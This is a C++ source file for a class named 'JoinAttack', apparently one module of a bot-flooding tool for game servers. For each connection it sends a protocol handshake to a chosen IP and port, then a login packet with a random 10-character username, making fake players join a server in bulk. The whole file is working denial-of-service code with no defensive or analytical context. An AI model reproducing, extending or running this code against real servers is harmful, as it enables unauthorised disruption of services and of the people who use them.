#include "join.h"

#include <algorithm>

#include "../netutils.h"
#include "../packet/handshake.h"
#include "../packet/login_start.h"

std::string random_string(size_t length) {
  auto randchar = []() -> char {
    const char charset[] =
        "0123456789"
        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
        "abcdefghijklmnopqrstuvwxyz";
    const size_t max_index = (sizeof(charset) - 1);
    return charset[rand() % max_index];
  };
  std::string str(length, 0);
  std::generate_n(str.begin(), length, randchar);
  return str;
}

JoinAttack::JoinAttack(int protocol, const std::string& ip, int port)
  : protocol(protocol) {
  Handshake(protocol, ip, port, Handshake::LOGIN).writeWrapped(handshake);
}

JoinAttack::~JoinAttack() = default;

void JoinAttack::accept(uv_stream_t* stream, const sockaddr_in *) {
  ByteBuffer login;
  LoginStart(protocol, random_string(10)).writeWrapped(login);

  write(stream, handshake);
  write(stream, login);
}